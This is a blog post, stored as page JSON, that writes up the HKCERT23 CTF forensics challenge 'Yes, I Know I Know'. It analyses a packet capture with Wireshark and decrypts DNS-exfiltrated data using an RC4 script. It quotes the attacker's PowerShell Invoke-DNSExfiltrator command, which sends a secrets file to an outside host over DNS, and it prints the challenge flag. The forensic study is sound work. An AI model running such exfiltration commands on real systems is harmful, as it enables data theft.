{"componentChunkName":"component---src-pages-blog-strapi-article-slug-tsx","path":"/blog/hkcert23-ctf-yes-i-know-i-know/","result":{"data":{"allStrapiArticle":{"nodes":[{"id":"7e19cc9d-3fb2-568f-ba60-2c564d87a4c0","slug":"hkcert23-ctf-yes-i-know-i-know","title":"HKCERT23 CTF - Yes, I Know I Know (200)","description":"https://ctftime.org/event/2122","content":{"data":{"content":"# Writeup\n\n## Investigate\nUse wireshark to open the provided `pcapng` file.   \n![Screenshot 2023-11-13 093152.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2023_11_13_093152_3779ba3011.png)\n\n\nfocus on the TCP stream first:   \n\n1. In `tcp.stream eq 20` you will see user Tom's machine and his pwsh command record, including ip address information, and machine directory consist a very sus file `secrets.txt.txt`. I suspect this file contains the flag.   \nAlso Tom download a remote pwsh script (http://igotoschoolbybus.online:8080/list-dns-servers.ps1)   \n\n2. In `tcp.stream eq 51` you will see the pwsh script content. The most important one is the last command:\n```powershell\nInvoke-DNSExfiltrator -i C:\\Users\\Tom\\Desktop\\secrets.txt.txt -d igotoschoolbybus.online -p 'K#2dF!8t@1qZ' -s 192.168.135.135\n```\nSeems like the secrets file is encrypted and then sent to 192.168.135.135, through the DNS protocol (through UDP) to the DNS server.   \nAlso from the comment of script content, we find that the code is come from DNSExfiltrator: https://github.com/Arno0x/DNSExfiltrator   \n\nWe can do the decrypt process by using the program.   \nOne more thing left - we still need to found the encrypted cipher ðŸ”’\n\n## Found cipher from UDP stream\n1.  We can use wireshark follow UDP stream to view the packet after the TCP stream specify in previous step. The cipher are split into 2 chunk, we can found them in `udp.stream eq 65` and `udp.stream eq 66` (see the image below).   \n![Screenshot_2023-11-10_231606.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2023_11_10_231606_9b9ef1f401.png)\n![Screenshot_2023-11-10_231652.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2023_11_10_231652_9e5c015761.png)\n\n\n2. Copy those 2 chunk data, and put it into the DNSExfiltrator program, then run the decrypt function, done ðŸ˜Ž\n\n## Solve Program\n\nHere is the final solve program:\n\n```python\n#!/usr/bin/python\n# -*- coding: utf8 -*-\nfrom base64 import b64decode, b32decode\nimport sys\n\nclass RC4:\n    def __init__(self, key = None):\n        self.state = range(256) # initialisation de la table de permutation\n        self.x = self.y = 0 # les index x et y, au lieu de i et j\n\n        if key is not None:\n            self.key = key\n            self.init(key)\n\n    # Key schedule\n    def init(self, key):\n        for i in range(256):\n            self.x = (ord(key[i % len(key)]) + self.state[i] + self.x) & 0xFF\n            self.state[i], self.state[self.x] = self.state[self.x], self.state[i]\n        self.x = 0\n\n    # Decrypt binary input data\n    def binaryDecrypt(self, data):\n        output = [None]*len(data)\n        for i in xrange(len(data)):\n            self.x = (self.x + 1) & 0xFF\n            self.y = (self.state[self.x] + self.y) & 0xFF\n            self.state[self.x], self.state[self.y] = self.state[self.y], self.state[self.x]\n            output[i] = (data[i] ^ self.state[(self.state[self.x] + self.state[self.y]) & 0xFF])\n        return bytearray(output)\n\ndef fromBase64URL(msg):\n    msg = msg.replace('_','/').replace('-','+')\n    if len(msg)%4 == 3:\n        return b64decode(msg + '=')\n    elif len(msg)%4 == 2:\n        return b64decode(msg + '==')\n    else:\n        return b64decode(msg)\n\nif __name__ == '__main__':\n    try:\n        rc4Decryptor = RC4(\"K#2dF!8t@1qZ\")\n        fileData = \"EO6ylFlsUc_7u_QD8gBDp8L8iFiGZGkhptC_QwnSem_ivrO3zFUgj-nfi9hMhgL?khV2U6tVzJq5EWnz-yXZhBWFmKMaKaM65qclb77kF5MWxV6mdVGDyj9BdDJS6uC?49h41eLONT5V_UHgksMdORol-2cYgWkzWj6H6ae8uRzgRMJjDmYss8XBOekyibe.tQVMNb2669ZzoRFkDZWIylBaJ5CLp8co2gYHOgdIDqj7CIEWkM\"\n        outputFileName = \"flag\" + \".zip\"\n        with open(outputFileName, 'wb+') as fileHandle:\n            fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(fromBase64URL(fileData))))\n            fileHandle.close()\n    except IOError:\n        print \"gg\"\n```\n\nflag: `hkcert23{v3ry_5n34ky_w17h_dn53xf1l7r470r_5345623}`\n"}},"updatedAt":"2023-12-01T15:11:36.379Z","publishedAt":"2023-11-12T22:53:55.273Z","tags":[{"name":"forensics","color":"blue"},{"name":"hkcertctf","color":"yellow"}],"categories":[{"name":"ctf","color":"red"}],"cover":{"formats":{"thumbnail":{"url":"/uploads/thumbnail_hkcert23_banner_0e9291d451.png"},"small":null}}}]}},"pageContext":{"id":"7e19cc9d-3fb2-568f-ba60-2c564d87a4c0","slug":"hkcert23-ctf-yes-i-know-i-know","__params":{"slug":"hkcert23-ctf-yes-i-know-i-know"}}},"staticQueryHashes":["3001278788"],"slicesMap":{}}